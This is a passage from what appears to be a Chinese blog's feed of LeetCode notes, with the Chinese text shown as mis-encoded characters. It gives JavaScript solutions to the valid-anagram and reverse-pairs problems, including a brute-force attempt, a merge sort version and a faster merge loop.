title="LeetCode242â€”â€”æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†ï¼‰"></a>LeetCode242â€”â€”æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/valid-anagram/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -17"><a href="#è‡ªå·±çš„ä»£ç -17" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length !== t.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        <span class="comment">// å¯ä»¥è¿™æ ·å†™ map[s[i]] = (map[s[i]] || 0) + 1;</span></span><br><span class="line">        map[s[i]] ? map[s[i]]++ : map[s[i]] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; t.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map[t[i]]) map[t[i]]--;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ACï¼Œå…¶å®è¿™å°±æ˜¯è®¡æ•°æ’åºäº†ã€‚</p><h2 id="LeetCode493â€”â€”ç¿»è½¬å¯¹ï¼ˆâ˜†â˜†â˜†ï¼‰"><a href="#LeetCode493â€”â€”ç¿»è½¬å¯¹ï¼ˆâ˜†â˜†â˜†ï¼‰" class="headerlink" title="LeetCode493â€”â€”ç¿»è½¬å¯¹ï¼ˆâ˜†â˜†â˜†ï¼‰"></a>LeetCode493â€”â€”ç¿»è½¬å¯¹ï¼ˆâ˜†â˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/reverse-pairs/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -18"><a href="#è‡ªå·±çš„ä»£ç -18" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reversePairs = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i+<span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">2</span> * nums[j]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ¯«æ— ç–‘é—®è¶…æ—¶äº†ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-18"><a href="#æ€è·¯-amp-é¢˜è§£-18" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p><strong>åˆå¹¶æ’åºï¼š</strong>ä½†æ˜¯ç”¨åˆ° shiftï¼Œå¯¼è‡´æ•°ç»„å¾ˆå¤§æ—¶è¿‡ä¸äº†æµ‹è¯•ï¼Œ<a href="http://stlighter.github.io/2016/06/08/%E5%85%B3%E4%BA%8EJavaScript%E4%B8%80%E4%BA%9B%E6%80%A7%E8%83%BD%E4%B8%8A%E7%9A%84%E7%96%91%E6%83%91/">å…·ä½“åŸå› </a>ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reversePairs = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> numReversePairs = <span class="number">0</span>; </span><br><span class="line">    mergeSort(nums);</span><br><span class="line">    <span class="keyword">return</span> numReversePairs;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> len = nums.length;</span><br><span class="line">        <span class="keyword">if</span>(len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> middle = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</span><br><span class="line">            left = nums.slice(<span class="number">0</span>, middle),</span><br><span class="line">            right = nums.slice(middle);</span><br><span class="line">        <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> result = [];</span><br><span class="line">      <span class="keyword">let</span> leftIndex = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">let</span> rightIndex = <span class="number">0</span>;  </span><br><span class="line">      <span class="keyword">while</span>(leftIndex &lt; left.length &amp;&amp; rightIndex &lt; right.length) &#123;</span><br><span class="line">          <span class="keyword">if</span> (left[leftIndex] &gt; <span class="number">2</span> * right[rightIndex]) &#123;</span><br><span class="line">          <span class="comment">// å› ä¸º left æ­¤æ—¶å·²ç»å‡åºï¼Œæ‰€ä»¥(left.length - leftIndex)é‡Œçš„æ‰€æœ‰æ•°éƒ½æ¯” right[rightIndex] å¤§ã€‚</span></span><br><span class="line">          numReversePairs += (left.length - leftIndex);</span><br><span class="line">          rightIndex++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          leftIndex++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;    </span><br><span class="line">      <span class="keyword">while</span> (left.length &gt; <span class="number">0</span> &amp;&amp; right.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left[<span class="number">0</span>] &lt; right[<span class="number">0</span>]) &#123;</span><br><span class="line">          result.push(left.shift());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          result.push(right.shift());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (left.length) &#123;</span><br><span class="line">        result.push(left.shift());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (right.length) &#123;</span><br><span class="line">        result.push(right.shift());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å› æ­¤åœ¨åˆå¹¶æ—¶ï¼Œå¯ä»¥ç”¨ä¸‹é¢ä»£ç ä»£æ›¿ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">leftIndex = <span class="number">0</span>;</span><br><span class="line">   rightIndex = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> (leftIndex &lt; left.length &amp;&amp; rightIndex &lt; right.length) &#123;</span><br><span class="line">     <span class="keyword">if</span> (left[leftIndex] &lt; right[rightIndex]) &#123;</span><br><span class="line">       nums_sorted.push(left[leftIndex++]);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       nums_sorted.push(right[rightIndex++]);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;é€’å½’&quot;&gt;&lt;a href=&quot;#é€’å½’&quot; class=&quot;headerlink&quot; title=&quot;é€’å½’&quot;&gt;&lt;/a&gt;é€’å½’&lt;/h1&gt;&lt;p&gt;æ¨¡æ¿ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;</summary>
      
    
    
    
    <category term="ç®—æ³•" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="ç®—æ³•" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
